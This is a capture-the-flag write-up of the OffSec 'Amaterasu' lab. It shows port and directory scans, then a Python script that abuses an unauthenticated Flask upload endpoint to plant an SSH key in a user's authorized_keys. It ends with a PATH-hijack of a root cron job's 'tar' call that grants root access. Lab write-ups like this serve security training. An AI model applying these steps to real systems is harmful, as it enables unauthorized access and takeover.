---
layout: post
title: "[Offsec] Amaterasu writeup"
categories: ctf offsec oscp
---

## Introduction

The challenge is at: [Offsec Labs Play](https://portal.offsec.com/labs/play)

![offsec](/assets/images/amaterasu/offsec.png)

## Scanning

Let's start with nmap scanning as usual

```
> sudo nmap -v -A -O 192.168.187.249 -p-
Starting Nmap 7.95 ( https://nmap.org ) at 2024-06-01 01:33 CDT
NSE: Loaded 157 scripts for scanning.
NSE: Script Pre-scanning.
Initiating NSE at 01:33
Completed NSE at 01:33, 0.00s elapsed
Initiating NSE at 01:33
Completed NSE at 01:33, 0.00s elapsed
Initiating NSE at 01:33
Completed NSE at 01:33, 0.00s elapsed
Initiating Ping Scan at 01:33
Scanning 192.168.187.249 [4 ports]
Completed Ping Scan at 01:33, 0.09s elapsed (1 total hosts)
Initiating Parallel DNS resolution of 1 host. at 01:33
Completed Parallel DNS resolution of 1 host. at 01:33, 0.02s elapsed
Initiating SYN Stealth Scan at 01:33
Scanning 192.168.187.249 [65535 ports]
Discovered open port 21/tcp on 192.168.187.249
Discovered open port 33414/tcp on 192.168.187.249
SYN Stealth Scan Timing: About 19.22% done; ETC: 01:36 (0:02:10 remaining)
Discovered open port 40080/tcp on 192.168.187.249
SYN Stealth Scan Timing: About 47.28% done; ETC: 01:35 (0:01:08 remaining)
Discovered open port 25022/tcp on 192.168.187.249
Completed SYN Stealth Scan at 01:35, 120.99s elapsed (65535 total ports)
Initiating Service scan at 01:35
Scanning 4 services on 192.168.187.249
Completed Service scan at 01:35, 11.18s elapsed (4 services on 1 host)
Initiating OS detection (try #1) against 192.168.187.249
Retrying OS detection (try #2) against 192.168.187.249
Initiating Traceroute at 01:35
Completed Traceroute at 01:35, 0.07s elapsed
Initiating Parallel DNS resolution of 4 hosts. at 01:35
Completed Parallel DNS resolution of 4 hosts. at 01:35, 0.02s elapsed
NSE: Script scanning 192.168.187.249.
Initiating NSE at 01:35
NSE: [ftp-bounce] PORT response: 500 Illegal PORT command.
Completed NSE at 01:36, 30.62s elapsed
Initiating NSE at 01:36
Completed NSE at 01:36, 0.43s elapsed
Initiating NSE at 01:36
Completed NSE at 01:36, 0.00s elapsed
Nmap scan report for 192.168.187.249
Host is up (0.055s latency).
Not shown: 65524 filtered tcp ports (no-response)
PORT      STATE  SERVICE          VERSION
21/tcp    open   ftp              vsftpd 3.0.3
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
|_Can't get directory listing: TIMEOUT
| ftp-syst:
|   STAT:
| FTP server status:
|      Connected to 192.168.45.225
|      Logged in as ftp
|      TYPE: ASCII
|      No session bandwidth limit
|      Session timeout in seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      At session startup, client count was 3
|      vsFTPd 3.0.3 - secure, fast, stable
|_End of status
22/tcp    closed ssh
111/tcp   closed rpcbind
139/tcp   closed netbios-ssn
443/tcp   closed https
445/tcp   closed microsoft-ds
2049/tcp  closed nfs
10000/tcp closed snet-sensor-mgmt
25022/tcp open   ssh              OpenSSH 8.6 (protocol 2.0)
| ssh-hostkey:
|   256 68:c6:05:e8:dc:f2:9a:2a:78:9b:ee:a1:ae:f6:38:1a (ECDSA)
|_  256 e9:89:cc:c2:17:14:f3:bc:62:21:06:4a:5e:71:80:ce (ED25519)
33414/tcp open   http             Werkzeug httpd 2.2.3 (Python 3.9.13)
|_http-title: 404 Not Found
|_http-server-header: Werkzeug/2.2.3 Python/3.9.13
40080/tcp open   http             Apache httpd 2.4.53 ((Fedora))
|_http-server-header: Apache/2.4.53 (Fedora)
|_http-title: My test page
| http-methods:
|   Supported Methods: GET POST OPTIONS HEAD TRACE
|_  Potentially risky methods: TRACE
Device type: general purpose|firewall|router
Running (JUST GUESSING): Linux 4.X|5.X|6.X|3.X (97%), IPFire 2.X (91%), MikroTik RouterOS 7.X (88%)
OS CPE: cpe:/o:linux:linux_kernel:4 cpe:/o:ipfire:ipfire:2.27 cpe:/o:linux:linux_kernel:5.15 cpe:/o:linux:linux_kernel:6.1 cpe:/o:mikrotik:routeros:7 cpe:/o:linux:linux_kernel:5.6.3 cpe:/o:linux:linux_kernel:3
Aggressive OS guesses: Linux 4.19 - 5.15 (97%), Linux 4.15 (92%), IPFire 2.27 (Linux 5.15 - 6.1) (91%), Linux 5.4 (90%), Linux 5.0 - 5.14 (88%), MikroTik RouterOS 7.2 - 7.5 (Linux 5.6.3) (88%), Linux 3.11 - 4.9 (88%), Linux 3.2 - 3.8 (88%)
No exact OS matches for host (test conditions non-ideal).
Uptime guess: 41.351 days (since Sat Apr 20 17:10:51 2024)
Network Distance: 4 hops
TCP Sequence Prediction: Difficulty=265 (Good luck!)
IP ID Sequence Generation: All zeros
Service Info: OS: Unix

TRACEROUTE (using port 111/tcp)
HOP RTT      ADDRESS
1   50.74 ms 192.168.45.1
2   50.71 ms 192.168.45.254
3   51.94 ms 192.168.251.1
4   51.92 ms 192.168.187.249

NSE: Script Post-scanning.
Initiating NSE at 01:36
Completed NSE at 01:36, 0.00s elapsed
Initiating NSE at 01:36
Completed NSE at 01:36, 0.00s elapsed
Initiating NSE at 01:36
Completed NSE at 01:36, 0.00s elapsed
Read data files from: /usr/bin/../share/nmap
OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 167.92 seconds
           Raw packets sent: 131230 (5.778MB) | Rcvd: 133 (6.240KB)

```

Going through potential attack surfaces, we have `vsftpd 3.0.3` that allows anonymous login, two http services, and an `ssh` service as well.

Let's scan the two http services, and in the mean time, we'll check out the vsftpd. We can try ssh bruteforcing, but that would cost lots of time and most probably unlikely to success.

```
> dirble http://192.168.187.249:40080
Dirble UNKNOWN (commit UNKNOWN, build 2019-07-11)
Developed by Izzy Whistlecroft

Targets: http://192.168.187.249:40080
Wordlist: /usr/share/dirble/dirble_wordlist.txt
No Prefixes
No Extensions
No lengths hidden

[INFO] Detected nonexistent paths for http://192.168.187.249:40080 are (CODE:404)
[INFO] Increasing wordlist-split for initial scan of http://192.168.187.249:40080 to 8
+ http://192.168.187.249:40080/LICENSE (CODE:200|SIZE:6555)
L http://192.168.187.249:40080/images/ (CODE:200|SIZE:894)
+ http://192.168.187.249:40080/index.html (CODE:200|SIZE:1092)
L http://192.168.187.249:40080/styles/ (CODE:200|SIZE:885)


Dirble Scan Report:

+ http://192.168.187.249:40080/LICENSE (CODE:200|SIZE:6555)
+ http://192.168.187.249:40080/index.html (CODE:200|SIZE:1092)

L http://192.168.187.249:40080/images/ (CODE:200|SIZE:894)

L http://192.168.187.249:40080/styles/ (CODE:200|SIZE:885)

```

```
dirble http://192.168.187.249:33414
Dirble UNKNOWN (commit UNKNOWN, build 2019-07-11)
Developed by Izzy Whistlecroft

Targets: http://192.168.187.249:33414
Wordlist: /usr/share/dirble/dirble_wordlist.txt
No Prefixes
No Extensions
No lengths hidden

[INFO] Detected nonexistent paths for http://192.168.187.249:33414 are (CODE:404)
[INFO] Increasing wordlist-split for initial scan of http://192.168.187.249:33414 to 8
Curl error after requesting http://192.168.187.249:33414/counter : [28] Timeout was reached
+ http://192.168.187.249:33414/counter (CODE:0|SIZE:0)
Curl error after requesting http://192.168.187.249:33414/contactus : [28] Timeout was reached
+ http://192.168.187.249:33414/contactus (CODE:0|SIZE:0)
+ http://192.168.187.249:33414/help (CODE:200|SIZE:137)
+ http://192.168.187.249:33414/info (CODE:200|SIZE:98)


Dirble Scan Report:

+ http://192.168.187.249:33414/contactus (CODE:0|SIZE:0)
+ http://192.168.187.249:33414/counter (CODE:0|SIZE:0)
+ http://192.168.187.249:33414/help (CODE:200|SIZE:137)
+ http://192.168.187.249:33414/info (CODE:200|SIZE:98)
```

## Breaking in

Okay, so looks like there is an API endpoint at port 33414. Let's see what it does.

```
> curl http://192.168.191.249:33414/help | jq                                                                                                      ~/Projects/OffSec/Labs/Amaterasu@homes5
  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
                                 Dload  Upload   Total   Spent    Left  Speed
100   137  100   137    0     0   1539      0 --:--:-- --:--:-- --:--:--  1556
[
  "GET /info : General Info",
  "GET /help : This listing",
  "GET /file-list?dir=/tmp : List of the files",
  "POST /file-upload : Upload files"
]
```

Let's try the `file-list` endpoint.
```
> curl http://192.168.191.249:33414/file-list\?dir\=/ | jq
  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
                                 Dload  Upload   Total   Spent    Left  Speed
100   140  100   140    0     0   1640      0 --:--:-- --:--:-- --:--:--  1627
[
  "boot",
  "dev",
  "proc",
  "run",
  "sys",
  "tmp",
  "etc",
  "root",
  "var",
  "usr",
  "bin",
  "sbin",
  "lib",
  "lib64",
  "home",
  "media",
  "mnt",
  "opt",
  "srv",
  ".autorelabel"
]
> curl http://192.168.191.249:33414/file-list\?dir\=/home | jq
  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
                                 Dload  Upload   Total   Spent    Left  Speed
100    12  100    12    0     0    138      0 --:--:-- --:--:-- --:--:--   139
[
  "alfredo"
]
```

Now let's try to use the `file-upload` one. This one is a bit tricky as we don't know how the server handles file upload with HTTP POST requests. But we can try all the possibilities.

Let's try a typical file upload request with python.

```python
import requests

files = {
    'file': open('./test.txt', 'rb'),
}

response = requests.post('http://192.168.191.249:33414/file-upload', files=files)
print(response.json())

```

```
{'message': 'No filename part in the request'}
```

One more thing to pay attention to: The API is in Python Flask. This was discovered using the file-list endpoint. Let's take a look at how to handle upload file with Python Flask.
[Uploading Files](https://flask.palletsprojects.com/en/2.3.x/patterns/fileuploads/)

After successfully uploading a test file. We can try to deliver our payload as an ssh accepted public key and connect to it.

```
# generate a new ssh key pair for payload
> ssh-keygen -t rsa -f id_rsa
# copy pub key to a new text file
> cp id_rsa.pub authorized_keys.txt
```

```py
import requests

files = {
    'file': open('./authorized_keys.txt', 'rb'),
    'filename': (None, '/home/alfredo/.ssh/authorized_keys'),
}

response = requests.post('http://192.168.191.249:33414/file-upload', files=files)
print(response.json())

```

Now let's use ssh to connect to it.
```
> ssh -i id_rsa -o IdentitiesOnly=yes alfredo@192.168.191.249 -p 25022
Last login: Tue Mar 28 03:21:25 2023
[alfredo@fedora ~]$ id
uid=1000(alfredo) gid=1000(alfredo) groups=1000(alfredo)
[alfredo@fedora ~]$ ls -lah
total 20K
drwx------. 4 alfredo alfredo  127 Mar 28  2023 .
drwxr-xr-x. 3 root    root      21 Mar 28  2023 ..
-rw-------. 1 alfredo alfredo 4.0K Jun 19 03:13 .bash_history
-rw-r--r--. 1 alfredo alfredo   18 Jan 25  2021 .bash_logout
-rw-r--r--. 1 alfredo alfredo  141 Jan 25  2021 .bash_profile
-rw-r--r--. 1 alfredo alfredo  492 Jan 25  2021 .bashrc
-rwx------. 1 alfredo alfredo   33 Jun 19 02:54 local.txt
drwxr-xr-x. 3 alfredo alfredo   54 Mar 28  2023 restapi
drwx------. 2 alfredo alfredo   61 Jun 19 03:06 .ssh
```

## Privilege Escalation

First of all, let's find all the SUID binaries. 

```
[alfredo@fedora ~]$ find /usr -type f -perm /4000
/usr/bin/fusermount
/usr/bin/chage
/usr/bin/gpasswd
/usr/bin/newgrp
/usr/bin/su
/usr/bin/mount
/usr/bin/umount
/usr/bin/pkexec
/usr/bin/crontab
/usr/bin/fusermount3
/usr/bin/sudo
/usr/bin/passwd
/usr/bin/chfn
/usr/bin/chsh
/usr/bin/at
/usr/bin/staprun
/usr/sbin/grub2-set-bootflag
/usr/sbin/pam_timestamp_check
/usr/sbin/unix_chkpwd
/usr/sbin/mount.nfs
/usr/lib/polkit-1/polkit-agent-helper-1
find: ‘/usr/share/polkit-1/rules.d’: Permission denied
find: ‘/usr/share/empty.sshd’: Permission denied
find: ‘/usr/libexec/initscripts/legacy-actions/auditd’: Permission denied
/usr/libexec/cockpit-session

```

I tried to look around those binaries. None of them seemed to work because they were all standard binaries.

```
[alfredo@fedora ~]$ EDITOR=vi crontab -e
no crontab for alfredo - using an empty one
# hit :!id to execute shell command under vi (vim)
uid=1000(alfredo) gid=1000(alfredo) groups=1000(alfredo)
```

Talking about crontab, let's also check the system crontab.
```
[alfredo@fedora ~]$ cat /etc/crontab 
SHELL=/bin/bash
PATH=/sbin:/bin:/usr/sbin:/usr/bin
MAILTO=root

# For details see man 4 crontabs

# Example of job definition:
# .---------------- minute (0 - 59)
# |  .------------- hour (0 - 23)
# |  |  .---------- day of month (1 - 31)
# |  |  |  .------- month (1 - 12) OR jan,feb,mar,apr ...
# |  |  |  |  .---- day of week (0 - 6) (Sunday=0 or 7) OR sun,mon,tue,wed,thu,fri,sat
# |  |  |  |  |
# *  *  *  *  * user-name  command to be executed

*/1 * * * * root /usr/local/bin/backup-flask.sh
[alfredo@fedora ~]$ cat /usr/local/bin/backup-flask.sh
#!/bin/sh
export PATH="/home/alfredo/restapi:$PATH"
cd /home/alfredo/restapi
tar czf /tmp/flask.tar.gz *
```

Interesting, the system crontab runs every minute, calling the script at `/usr/local/bin/backup-flask.sh` as root. The script adds the place we have control of to PATH. That's good enough. We'll create a script named `tar` in `restapi` folder and copy the `authorized_keys` file to `/root/.ssh`
```
[alfredo@fedora restapi]$ cat tar
#!/bin/bash

mkdir -p /root/.ssh
cp /home/alfredo/.ssh/authorized_keys /root/.ssh/
```

Wait 1 minute for the cron to execute. And after that we can connect to it.

```
> ssh -i id_rsa -o IdentitiesOnly=yes root@192.168.191.249 -p 25022                                                                                ~/Projects/OffSec/Labs/Amaterasu@homes5
Web console: https://fedora:9090/

Last login: Tue Mar 28 03:21:22 2023
[root@fedora ~]# id
uid=0(root) gid=0(root) groups=0(root)
```